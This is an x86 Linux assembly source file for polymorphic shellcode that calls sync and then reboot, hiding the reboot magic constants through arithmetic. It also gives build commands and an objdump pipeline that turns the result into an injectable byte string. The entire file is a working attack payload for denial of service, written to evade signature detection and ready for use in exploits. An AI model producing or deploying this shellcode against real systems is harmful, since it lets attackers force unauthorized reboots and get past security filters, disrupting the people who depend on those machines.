; compile with:
; 	nasm -f elf32 shellcode-639-poly.asm
;	ld -o shellcode-639-poly shellcode-639-poly.o
; extract shellcode with:
; 	objdump -d shellcode-639-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
	_start:
		mov al,0x23 ; mov in al register the sycall number-1 for sync
		inc al ; increment the al register to match the syscall number for sync 
		int 0x80 ; interrupt to execute sync syscall
		xor eax, eax ; zeroing eax to ensure that even in case of failure of sync the reboot syscall number is correctly stored
		mov al, 0x58 ; mov in al the syscall number for the reboot syscall
		mov ebx, 0x7f70ef56 ; 0xfee1dead / 2
    	add ebx, ebx ; recalculate 0xfee1dead
    	add ebx, 1 ; recalculate 0xfee1dead
		mov ecx, 0x5121996 ; LINUX_REBOOT_MAGIC2A
		mov edx, 0x2468ace ; 0x1234567 << 1
		ror edx, 1 ; shift right to get back 0x1234567
		int 0x80 ; interrupt to execute reboot syscall - no need to execute also the exit syscall